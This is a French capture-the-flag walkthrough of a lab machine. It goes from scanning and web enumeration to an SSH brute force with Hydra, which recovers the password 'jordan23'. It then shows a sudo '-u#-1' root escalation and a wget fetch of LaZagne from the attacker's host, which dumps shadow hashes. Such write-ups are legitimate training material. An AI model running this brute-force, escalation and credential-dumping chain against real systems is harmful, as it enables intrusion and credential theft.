\# HackathonCTF

**<span style="color: #dddddd;">👁️</span> Massap**

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $sudo sh massap.sh

   *                                
 (  `                               
 )\))(      )             )         
((_)()\  ( /(  (   (   ( /(  `  )   
(_()((_) )(_)) )\  )\  )(_)) /(/(   
|  \/  |((_)_ ((_)((_)((_)_ ((_)_\  
| |\/| |/ _` |(_-<(_-</ _` || '_ \) 
|_|  |_|\__,_|/__//__/\__,_|| .__/  
                            |_|     

by M0rPH3U53
      
[i] Scan IP: 192.168.56.80
[i] Rate: 1000
 
[+] Scan Masscan 192.168.56.80...100%
[+] Scan Nmap 192.168.56.80...100%
 
[+] 23/tcp open
[+] 21/tcp open
[+] 7223/tcp open
[+] 80/tcp open
 
==========================================================
|                         Rapports                       |
==========================================================
| Nmap:/home/m0rph3u5/Massap/192.168.56.80-tcp.html      |
==========================================================
```

&nbsp;

<span style="color: #dddddd;"><span style="color: #dddddd;">👊</span></span> **Gobuster**

Voyons ce qui se cache sur ce serveur web

```
┌─[m0rph3u5@parrot]─[~/Documents]
└──╼ $gobuster dir -u http://192.168.56.80 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.80
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 289]
/.htpasswd 	      (Status: 403) [Size: 289]
/index.html           (Status: 200) [Size: 227]           
/robots.txt           (Status: 200) [Size: 139]
/server-status        (Status: 403) [Size: 293]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
```

&nbsp;

Contenu du `robots.txt`

```
┌──[m0rph3u5@parrot]─[~/Documents]
└──╼ $curl http://192.168.56.80/robots.txt
user-agent: *
Disallow: /ctf

user-agent: *
Disallow: /ftc

user-agent: *
Disallow: /sudo

c3NoLWJydXRlZm9yY2Utc3Vkb2l0Cg==

```

&nbsp;

Décode de la chaîne `base64`

```
┌─[m0rph3u5@parrot]─[~]
└──╼ $curl http://192.168.56.80/robots.txt | base64 -d
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   139  100   139    0     0  83886      0 --:--:-- --:--:-- --:--:--  135k
ssh-bruteforce-sudoit: entrée incorrecte
```

&nbsp;

Etant donner que index est en `.html` supposons que `/sudo` aussi

```
┌──[m0rph3u5@parrot]─[~/Documents]
└──╼ $curl http://192.168.56.80/sudo.html
<html>
<body style="background-color:#000000">
 <h1 style="color: #f5f5f5 ; font-size: 100px ; text-align: center;">Just Sudo It..</h1>
<h1 style="color: #616161; text-align: center;">From the little spark may burst a mighty flame.</h1>

</body>

#uname : test

</html>

```

&nbsp;

<span style="color: #dddddd;">💢</span> **Hydra**

Brute force du password de l’utilisateur `test`

```
┌──[m0rph3u5@parrot]─[~/Documents]
└──╼ $hydra -l test -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://192.168.56.80:7223

[DATA] attacking ssh://192.168.56.80:7223/
[STATUS] 176.00 tries/min, 176 tries in 00:01h, 845 to do in 00:05h, 16 active

[7223][ssh] host: 192.168.56.80   login: test   password: jordan23

```

&nbsp;

Exploitation d’une faille `root`

```
test@ctf:~$ sudo -u#-1 /bin/bash
root@ctf:~# id
uid=0(root) gid=0(root) groups=0(root
```

&nbsp;

<span style="color: #dddddd;">👾</span> **LaZagne**

Upload de lazagne

```
root@ctf:~# wget 192.168.56.104:8080/LaZagne-2.4.6.zip
--2025-02-11 13:25:15--  http://192.168.56.104:8080/LaZagne-2.4.6.zip
Connecting to 192.168.56.104:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 705000 (688K) [application/zip]
Saving to: 'LaZagne-2.4.6.zip'

100%[====================================================================================================================================================>] 705,000     --.-K/s   in 0.009s  

2025-02-11 13:25:15 (74.1 MB/s) - 'LaZagne-2.4.6.zip' saved [705000/705000]

```

&nbsp;

Unzip

```
root@ctf:~# unzip LaZagne-2.4.6.zip
Archive:  LaZagne-2.4.6.zip
3ed06c785c417a77c2bc9a09987060425249036d
   creating: LaZagne-2.4.6/
```

&nbsp;

Exécution

```
root@ctf:~# python3 LaZagne-2.4.6/Linux/laZagne.py all

|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: ctf
Hash: $6$ymDhCuKm$/tTrpgfJzB0pFyokLD4XC.YK5sN/BezfYsZaN5kPwly2TcQRelVNflpFfSaZiaEciKcSkyxup0DLHZV2y5Uun1:18558:0:99999:7:::

[+] Hash found !!!
Login: test
Hash: $6$1cHweVR/$i/MOnpjV24w4pGVA9w9nNEoAN8rbF7xJTlEucf7/bX69F2ctFwpbyqxWVXDjzu6LurQBlvI6NmJvBJqa0Z3uE/:18557:0:99999:7:::


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.029090404510498047

```

&nbsp;

identifiant trouver

| Users | Password |
| --- | --- |
| test | jordan23 |

&nbsp;